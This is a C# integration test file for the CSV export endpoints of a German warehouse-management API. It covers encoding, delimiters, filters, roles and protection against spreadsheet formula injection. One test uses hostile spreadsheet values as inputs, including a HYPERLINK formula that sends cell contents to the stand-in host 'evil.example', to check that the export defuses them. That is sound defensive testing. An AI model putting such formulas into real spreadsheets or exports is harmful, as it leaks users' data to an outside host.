using System.Net;
using System.Net.Http.Json;
using System.Text.RegularExpressions;
using Lager.Application.ImportExport;
using Lager.Contracts.Orders;
using Lager.Tests.Infrastructure;
using static Lager.Tests.WP24.Wp24Support;

namespace Lager.Tests.WP24;

/// <summary>
/// Die Export-Endpunkte <c>/api/export/*.csv</c> gegen die laufende API: Excel-DE-taugliches Format (UTF-8 mit BOM, Semikolon,
/// Dezimalkomma), Formel-Injection-Schutz, Dateiname mit UTC-Zeit, Filter von Bewegungen und Audit und die Rollen.
/// </summary>
public class ExportEndpointTests : IClassFixture<ImportExportFixture>
{
    private readonly ImportExportFixture _fx;

    public ExportEndpointTests(ImportExportFixture fixture) => _fx = fixture;

    [Fact]
    public async Task Articles_export_is_a_UTF8_BOM_semicolon_file_with_decimal_comma_and_a_UTC_file_name()
    {
        var sku = WorldBuilder.Unique("EXP");
        var supplierId = await _fx.W.AddSupplierAsync();
        await CreateArticleAsync(_fx.Admin, NewArticle(sku, "Größe Ä", Gtin13A, new[] { "ALT-1", "ALT-2" }, priceCents: 1250, supplierId: supplierId,
            validFrom: new DateTime(2026, 3, 1, 0, 0, 0, DateTimeKind.Utc), validUntil: new DateTime(2026, 9, 30, 0, 0, 0, DateTimeKind.Utc),
            stacking: new Lager.Contracts.Articles.StackingInfoDto(true, "X", 50, 4), min: 5, reorder: 10, max: 100));

        var response = await _fx.Admin.GetAsync("/api/export/articles.csv");
        var bytes = await response.Content.ReadAsByteArrayAsync();

        Assert.Equal(HttpStatusCode.OK, response.StatusCode);
        Assert.Equal("text/csv", response.Content.Headers.ContentType!.MediaType);
        Assert.Equal("utf-8", response.Content.Headers.ContentType.CharSet);
        Assert.Equal(new byte[] { 0xEF, 0xBB, 0xBF }, bytes[..3]);                       // BOM: Excel erkennt UTF-8
        Assert.Matches(new Regex(@"^articles-\d{8}T\d{6}Z\.csv$"), response.Content.Headers.ContentDisposition!.FileName!.Trim('"'));
        Assert.Equal("attachment", response.Content.Headers.ContentDisposition.DispositionType);

        var text = CsvText.Decode(bytes);
        Assert.StartsWith("Sku;Name;Description;Gtin;LengthMm;WidthMm;HeightMm;WeightGrams;IsStackable;StackingAxis;StackingIncrementMm;MaxStackCount;" +
                          "MinStock;ReorderPoint;MaxStock;PurchasePrice;SupplierCode;AlternativeSkus;ValidFrom;ValidUntil\r\n", text);
        var row = Rows(text).Single(r => r[0] == sku);
        Assert.Equal("Größe Ä", row[1]);                                                 // Umlaute unversehrt
        Assert.Equal(Gtin13A, row[3]);
        Assert.Equal(new[] { "120", "80", "40", "250", "true", "X", "50", "4", "5", "10", "100" }, row.Skip(4).Take(11).ToArray());
        Assert.Equal("12,50", row[15]);                                                  // Dezimalkomma
        Assert.Equal("ALT-1|ALT-2", row[17]);
        Assert.Equal("2026-03-01", row[18]);
        Assert.Equal("2026-09-30", row[19]);
    }

    [Fact]
    public async Task With_the_comma_delimiter_decimals_use_a_point_and_fields_with_commas_are_quoted()
    {
        var sku = WorldBuilder.Unique("COMMA");
        await CreateArticleAsync(_fx.Admin, NewArticle(sku, "Schraube, verzinkt", priceCents: 1250));

        var text = await ExportTextAsync(_fx.Admin, "/api/export/articles.csv?delimiter=comma");

        Assert.StartsWith("Sku,Name,Description,Gtin,", text);
        var row = Rows(text, ',').Single(r => r[0] == sku);
        Assert.Equal("Schraube, verzinkt", row[1]);
        Assert.Equal("12.50", row[15]);
        Assert.Contains($"{sku},\"Schraube, verzinkt\"", text);
    }

    [Fact]
    public async Task A_formula_in_a_text_cell_is_defused_in_the_file()
    {
        var sku = WorldBuilder.Unique("INJ");
        var formula = "=HYPERLINK(\"http://evil.example/?x=\"&A1;\"Klick\")";
        await CreateArticleAsync(_fx.Admin, NewArticle(sku, formula, description: "@SUM(1+1)", alternatives: new[] { "+cmd", "-2+3" }));

        var text = await ExportTextAsync(_fx.Admin, "/api/export/articles.csv");

        var row = Rows(text).Single(r => r[0] == sku);
        Assert.Equal("'" + formula, row[1]);                                             // Apostroph davor: Excel zeigt Text statt zu rechnen
        Assert.Equal("'@SUM(1+1)", row[2]);
        Assert.Equal("'+cmd|-2+3", row[17]);                                             // nur der Zellanfang zählt
        foreach (var cells in Rows(text))
            foreach (var cell in cells.Where(c => c.Length > 0))
                Assert.DoesNotContain(cell[0], "=+-@\t\r");                             // keine Zelle beginnt mit einem Formelzeichen
    }

    [Fact]
    public async Task An_invalid_delimiter_or_range_is_a_clean_400_before_any_file_bytes()
    {
        var delimiter = await _fx.Admin.GetAsync("/api/export/articles.csv?delimiter=tab");
        var reversed = await _fx.Admin.GetAsync("/api/export/movements.csv?from=2026-10-01&to=2026-09-01");
        var unreadable = await _fx.Admin.GetAsync("/api/export/audit.csv?from=gestern");

        Assert.Equal(HttpStatusCode.BadRequest, delimiter.StatusCode);
        Assert.Equal("application/problem+json", delimiter.Content.Headers.ContentType!.MediaType);
        Assert.Contains("Trennzeichen", await ProblemDetailAsync(delimiter));
        Assert.Equal(HttpStatusCode.BadRequest, reversed.StatusCode);
        Assert.Contains("'von' muss vor 'bis' liegen", await ProblemDetailAsync(reversed));
        Assert.Equal(HttpStatusCode.BadRequest, unreadable.StatusCode);
    }

    [Fact]
    public async Task Stock_orders_movements_and_audit_exports_carry_the_real_data()
    {
        var article = await _fx.W.AddArticleAsync(WorldBuilder.Unique("FLOW"), priceCents: 499);
        var second = await _fx.W.AddArticleAsync(WorldBuilder.Unique("FLOW"));
        var bin = _fx.Warehouse.PickA;
        var expiry = new DateTime(2027, 5, 31, 0, 0, 0, DateTimeKind.Utc);

        // Bestand über den Import (gebucht: Ledger + Bewegung) und eine Bestellung über die API
        var stockCsv = Csv("Sku;Location;Quantity;LotNumber;ExpiryDate", $"{article.Sku};{bin.Code};12;LOT-X;2027-05-31");
        Assert.True((await ImportAsync(_fx.Admin, "stock", stockCsv, dryRun: false)).Applied);
        var orderNumber = WorldBuilder.Unique("ORD");
        Assert.Equal(HttpStatusCode.Created, (await _fx.Admin.PostAsJsonAsync("/api/orders/manual", new CreateOrderRequest(orderNumber, "=Kunde", new[]
        {
            new CreateOrderLineRequest(article.Id, 3), new CreateOrderLineRequest(null, 2, second.Sku),
        }, Priority: 2, DueDate: new DateTime(2026, 12, 24, 0, 0, 0, DateTimeKind.Utc), ExternalReference: "SHOP-42"))).StatusCode);

        // Bestand: nur Zeilen mit Menge, mit Charge und MHD
        var stockRow = Rows(await ExportTextAsync(_fx.Admin, "/api/export/stock.csv")).Single(r => r[0] == article.Sku);
        Assert.Equal(new[] { article.Sku, "Artikel " + article.Sku, bin.Code, "12", "LOT-X", "2027-05-31" }, stockRow);

        // Bestellungen: eine Zeile je Position, Kopfdaten wiederholt, Kundenreferenz entschärft
        var orderRows = Rows(await ExportTextAsync(_fx.Admin, "/api/export/orders.csv")).Where(r => r[0] == orderNumber).ToList();
        Assert.Equal(2, orderRows.Count);
        Assert.All(orderRows, r =>
        {
            Assert.Equal(new[] { "New", "Manual" }, r.Skip(1).Take(2).ToArray());
            Assert.Equal(new[] { "'=Kunde", "2", "2026-12-24", "SHOP-42" }, new[] { r[4], r[5], r[6], r[7] });
        });
        Assert.Equal(
            new[] { (article.Sku, "3"), (second.Sku, "2") }.OrderBy(x => x.Item1, StringComparer.Ordinal).ToArray(),
            orderRows.Select(r => (r[8], r[9])).OrderBy(x => x.Item1, StringComparer.Ordinal).ToArray());

        // Bewegungen: Zeitraum-Filter, Zugang mit Referenz CsvImport
        var today = DateTime.UtcNow.ToString("yyyy-MM-dd");
        var tomorrow = DateTime.UtcNow.AddDays(1).ToString("yyyy-MM-dd");
        var movements = Rows(await ExportTextAsync(_fx.Admin, $"/api/export/movements.csv?from={today}&to={tomorrow}")).Where(r => r[1] == article.Sku).ToList();
        var movement = Assert.Single(movements);
        Assert.Equal(new[] { article.Sku, bin.Code, "12", "Adjust", "CsvImport" }, new[] { movement[1], movement[2], movement[3], movement[4], movement[5] });
        Assert.Equal(expiry.ToString("yyyy-MM-dd"), movement[8]);
        Assert.Equal("LOT-X", movement[7]);
        Assert.Equal("4,99", movement[9]);
        var yesterday = DateTime.UtcNow.AddDays(-2).ToString("yyyy-MM-dd");
        Assert.DoesNotContain(Rows(await ExportTextAsync(_fx.Admin, $"/api/export/movements.csv?from={yesterday}&to={yesterday}")), r => r[1] == article.Sku);

        // Audit: Zeitraum und Benutzer (ohne Beachtung der Schreibweise) filtern
        var auditAll = Rows(await ExportTextAsync(_fx.Admin, $"/api/export/audit.csv?from={today}&to={tomorrow}&user=ADMIN"));
        Assert.Contains(auditAll, r => r[2] == "CsvImport" && r[3].Length > 0 && r[4] == "Import" && r[1] == "admin");
        Assert.All(auditAll, r => Assert.Equal("admin", r[1]));
        Assert.Empty(Rows(await ExportTextAsync(_fx.Admin, "/api/export/audit.csv?user=niemand")));
        Assert.Empty(Rows(await ExportTextAsync(_fx.Admin, $"/api/export/audit.csv?from={yesterday}&to={yesterday}")));
    }

    [Theory]
    [InlineData("Viewer")]
    [InlineData("Picker")]
    [InlineData("Packer")]
    [InlineData("Receiver")]
    public async Task Only_managers_and_admins_may_export(string role)
    {
        var client = await _fx.W.ClientAsync(role);

        foreach (var file in new[] { "articles", "stock", "orders", "movements", "audit" })
            Assert.Equal(HttpStatusCode.Forbidden, (await client.GetAsync($"/api/export/{file}.csv")).StatusCode);
    }

    [Fact]
    public async Task A_manager_may_export_and_an_anonymous_caller_gets_401()
    {
        var manager = await _fx.W.ClientAsync("Manager");

        Assert.Equal(HttpStatusCode.OK, (await manager.GetAsync("/api/export/articles.csv")).StatusCode);
        Assert.Equal(HttpStatusCode.Unauthorized, (await _fx.W.Anonymous().GetAsync("/api/export/articles.csv")).StatusCode);
    }
}
